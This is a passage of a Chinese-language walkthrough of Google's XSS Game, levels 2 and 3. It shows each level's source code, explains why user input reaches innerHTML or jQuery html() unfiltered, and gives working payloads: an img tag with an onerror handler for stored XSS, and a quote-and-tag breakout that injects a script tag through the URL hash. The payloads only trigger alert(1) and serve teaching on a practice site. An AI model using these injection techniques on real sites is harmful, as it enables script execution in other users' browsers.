tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>shim<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>?<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post-content<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span>              <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>share<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Share status!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>action<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sign<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>Post-store.js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/* * Objects to implement a client-side post database. */</span> <span class="token keyword">function</span> <span class="token function">Post</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>message <span class="token operator">=</span> message<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token function">PostDB</span><span class="token punctuation">(</span><span class="token parameter">defaultMessage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// Initial message to display to users</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>_defaultMessage <span class="token operator">=</span> defaultMessage <span class="token operator">||</span> <span class="token string">""</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">setup</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> defaultPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>defaultMessage<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string-property property">"posts"</span> <span class="token operator">:</span> <span class="token punctuation">[</span>defaultPost<span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">save</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> newPost <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Post</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> allPosts <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getPosts</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    allPosts<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>newPost<span class="token punctuation">)</span><span class="token punctuation">;</span>    window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token string-property property">"posts"</span> <span class="token operator">:</span> allPosts    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">clear</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">getPosts</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>posts<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>window<span class="token punctuation">.</span>localStorage<span class="token punctuation">[</span><span class="token string">"postDB"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>posts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">'&lt;table class="message"> &lt;tr> &lt;td valign=top> '</span>            <span class="token operator">+</span> <span class="token string">'&lt;img src="/static/level2_icon.png"> &lt;/td> &lt;td valign=top '</span>            <span class="token operator">+</span> <span class="token string">' class="message-container"> &lt;div class="shim">&lt;/div>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;b>You&lt;/b>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">'&lt;span class="date">'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>date<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;/span>'</span><span class="token punctuation">;</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;blockquote>"</span> <span class="token operator">+</span> posts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>message <span class="token operator">+</span> <span class="token string">"&lt;/blockquote"</span><span class="token punctuation">;</span> <span class="token comment">//这还少个 '>' 23333</span>          html <span class="token operator">+=</span> <span class="token string">"&lt;/td>&lt;/tr>&lt;/table>"</span>          containerEl<span class="token punctuation">.</span>innerHTML <span class="token operator">+=</span> html<span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span></code></pre><p>可以发现我们提交的内容输出字段会被<code>&lt;blockquote&gt;</code>包裹，考虑到数据是存储的服务器上的可以利用存储型xss，利用<code>onerror</code>事件来进行xss</p><blockquote><p>onerror 事件在视频&#x2F;音频（audio&#x2F;video）数据加载期间发生错误时触发。</p></blockquote><p>利用img标签加载一个不存在的对象，会触发onerror事件</p><p>payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"javascript:alert(1);"</span><span class="token operator">/</span><span class="token operator">></span></code></pre><p>代码存进了服务器里，只要刷新都会触发</p><img src="/article/xss/image-20210424145306208.png" class="" title="level2-1" loading="lazy"><img src="/article/xss/image-20210424145406792.png" class="" title="level2-2" loading="lazy"><hr><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p><a href="https://xss-game.appspot.com/level3/frame#1">https://xss-game.appspot.com/level3/frame#1</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>     <span class="token comment">&lt;!-- Load jQuery --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span>      <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">      <span class="token keyword">function</span> <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Dynamically load the appropriate image.</span>        <span class="token keyword">var</span> html <span class="token operator">=</span> <span class="token string">"Image "</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span>         <span class="token comment">// Select the current tab</span>        <span class="token keyword">var</span> tabs <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelectorAll</span><span class="token punctuation">(</span><span class="token string">'.tab'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tabs<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id <span class="token operator">==</span> <span class="token string">"tab"</span> <span class="token operator">+</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab active"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            tabs<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">"tab"</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         <span class="token comment">// Tell parent we've changed the tab</span>        top<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       window<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>       <span class="token comment">// Extra code so that we can communicate with the parent page</span>      window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">event</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>source <span class="token operator">==</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token function">unescape</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level3.png<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Take a tour of our cloud data center.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab1<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab2<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tab3<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">chooseTab</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>Image 3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tabContent<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>Level.py</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MainPage</span><span class="token punctuation">(</span>webapp<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> context<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>response<span class="token punctuation">.</span>out<span class="token punctuation">.</span>write<span class="token punctuation">(</span>template<span class="token punctuation">.</span>render<span class="token punctuation">(</span>path<span class="token punctuation">,</span> context<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span> application <span class="token operator">=</span> webapp<span class="token punctuation">.</span>WSGIApplication<span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token punctuation">(</span><span class="token string">'.*'</span><span class="token punctuation">,</span> MainPage<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span></code></pre><p>关键代码</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">html <span class="token operator">+=</span> <span class="token string">"&lt;img src='/static/level3/cloud"</span> <span class="token operator">+</span> num <span class="token operator">+</span> <span class="token string">".jpg' />"</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#tabContent'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">;</span>         window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>hash <span class="token operator">=</span> num<span class="token punctuation">;</span></code></pre><p><code>num</code>是#后面的输入，没有经过任何过滤，所以让它的img标签闭合，再加上我们的代码即可</p><p><code>&lt;img src=&#39;/static/level3/cloud + num + .jpg&#39; /&gt;</code></p><p>即变为<code>&lt;img src=&#39;/static/level3/cloud&#39;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;.jpg&#39; /&gt;</code></p><p>Payload：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">'<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span></code></pre><img src="/article/xss/image-20210424150902973.png" class="" title="level3-1" loading="lazy"><img src="/article/xss/image-20210424150928175.png" class="" title="level3-2" loading="lazy"><hr><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><a href="https://xss-game.appspot.com/level4/frame#">https://xss-game.appspot.com/level4/frame#</a></p><p>源码·index.html</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!-- Internal game scripts/styles, mostly boring stuff --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/game-frame-styles.css<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>level4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/logos/level4.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token 